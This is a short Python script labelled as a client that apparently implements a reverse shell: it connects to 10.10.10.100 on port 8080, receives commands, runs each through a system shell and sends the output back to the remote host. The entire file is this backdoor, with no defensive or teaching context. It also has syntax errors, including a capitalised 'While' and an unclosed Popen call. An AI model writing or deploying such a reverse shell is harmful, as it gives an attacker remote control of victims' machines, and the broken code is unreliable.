#Client 


import socket   #For building TCP Connection
import subprocess   #To start the shell in the system

def connect():
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 s.connect(('10.10.10.100', 8080))
	 
	 
	 
	 While True:   #Keep recieving commands
		 command = s.recv(1024)
		 
		 
		 if 'terminate' in command:
			 s.close()   #Close the socket
			 break
		else:
			
			
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
			
			s.send( CMD.stdout.read() )  #Send the result
			s.send( CMD.stderr.read() )  #Incase you mistyped
			
			
def main():
	connect()
	
main()


		 
